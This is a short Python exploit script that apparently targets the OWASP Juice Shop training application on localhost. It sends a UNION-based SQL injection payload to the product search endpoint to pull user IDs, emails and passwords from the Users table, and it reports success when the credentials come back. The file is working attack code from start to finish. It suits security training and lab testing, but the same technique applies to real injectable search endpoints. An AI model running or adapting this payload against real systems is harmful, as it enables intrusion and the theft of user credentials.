#!/usr/bin/env python3
"""
SQL Injection - Search Union Injection
Target: /rest/products/search?q=
Payload: ' UNION SELECT id, email, password, '1', '2', '3', '4', '5', '6', '7' FROM Users--
"""
import requests
import sys
import json

BASE_URL = "http://localhost:3000"
SEARCH_ENDPOINT = f"{BASE_URL}/rest/products/search"

# SQL Injection payload for UNION-based data exfiltration
# Juice Shop Products table has 10 columns; Users table has id, email, password, etc.
payload = "' UNION SELECT id, email, password, '1', '2', '3', '4', '5', '6', '7' FROM Users--"

params = {"q": payload}

print(f"[*] Target: {SEARCH_ENDPOINT}")
print(f"[*] Payload: {payload}")

response = requests.get(SEARCH_ENDPOINT, params=params)
print(f"[*] Status: {response.status_code}")

try:
    data = response.json()
    print(f"[*] Response keys: {data.keys()}")
    if "data" in data:
        for item in data["data"]:
            print(f"[+] Found: {json.dumps(item, indent=2)}")
except:
    print(f"[*] Raw response: {response.text[:500]}")

# Check if we got user data
if "data" in response.text and "email" in response.text:
    print("[+] SUCCESS: User credentials exfiltrated!")
    sys.exit(0)
else:
    print("[-] FAILED: No user data in response")
    sys.exit(1)